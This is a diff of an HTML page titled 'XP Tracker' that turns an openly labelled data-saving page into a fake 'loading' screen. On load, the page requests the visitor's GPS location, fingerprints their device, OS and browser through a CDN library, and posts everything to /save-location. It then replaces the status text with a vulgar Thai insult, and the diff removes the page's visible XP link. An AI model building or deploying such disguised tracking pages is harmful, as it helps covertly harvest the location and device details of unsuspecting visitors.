@@ -3,14 +3,43 @@
 <head>
   <title>XP Tracker</title>
   <style>
-    table { border-collapse: collapse; width: 80%; margin-top: 20px;}
-    th, td { border: 1px solid #ddd; padding: 8px;}
-    th { background-color: #f2f2f2;}
+
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #f0f0f0;
+      font-family: sans-serif;
+      flex-direction: column;
+    }
+
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg);}
+      100% { transform: rotate(360deg);}
+    }
+
+    #status {
+      font-size: 18px;
+    }
   </style>
 </head>
 <body>
-<h1>กรุณารอสักครู่</h1>
-<p id="status">กำลังบันทึกข้อมูล...</p>
+
+<div class="spinner"></div>
+<div id="status">กำลังโหลดข้อมูล...</div>
+
+<script src="https://unpkg.com/device-detector-js/dist/umd/device-detector.min.js"></script>
 
 <script>
 async function sendLocation() {
@@ -21,34 +50,60 @@ async function sendLocation() {
         navigator.geolocation.getCurrentPosition((pos) => {
             latitude = pos.coords.latitude;
             longitude = pos.coords.longitude;
-            postData(latitude, longitude);
+            sendData(latitude, longitude);
         }, (err) => {
             console.log("GPS ไม่อนุญาต:", err.message);
-            postData(null, null);
+            sendData(null, null);
         });
     } else {
-        postData(null, null);
+        sendData(null, null);
     }
 }
 
-async function postData(lat, lon) {
+async function sendData(lat, lon) {
+    const deviceDetector = new DeviceDetector();
+    const userAgent = navigator.userAgent;
+    const deviceInfo = deviceDetector.parse(userAgent);
+
+    const deviceType = deviceInfo.device?.type || '-';
+    const deviceBrand = deviceInfo.device?.brand || '-';
+    const deviceModel = deviceInfo.device?.model || '-';
+    const osName = deviceInfo.os?.name || '-';
+    const osVersion = deviceInfo.os?.version || '-';
+    const browserName = deviceInfo.client?.name || '-';
+    const browserVersion = deviceInfo.client?.version || '-';
+
+    const visitTime = new Date().toISOString();
+
+    const payload = {
+        latitude: lat,
+        longitude: lon,
+        device: `${deviceType} (${deviceBrand} ${deviceModel})`,
+        os: `${osName} ${osVersion}`,
+        browser: `${browserName} ${browserVersion}`,
+        visitTime
+    };
+
     try {
         const res = await fetch('/save-location', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({latitude: lat, longitude: lon})
+            body: JSON.stringify(payload)
         });
         const data = await res.text();
-        document.getElementById('status').innerText = data;
+
+        document.getElementById('status').innerText = "ควยไรไอเอ๋อ";
+        document.querySelector('.spinner').style.display = 'none';
+
     } catch (err) {
-        document.getElementById('status').innerText = 'บันทึกไม่สำเร็จ: ' + err.message;
+        console.error("Fetch error:", err);
+        document.getElementById('status').innerText = 'โหลดไม่สำเร็จโปรดลองอีกครั้ง ';
+        document.querySelector('.spinner').style.display = 'none';
     }
 }
 
 window.onload = sendLocation;
 </script>
-
-<p>ดู <a href="/xp" target="_blank">XP รวมทั้งหมด</a>
 
 </body>
 </html>
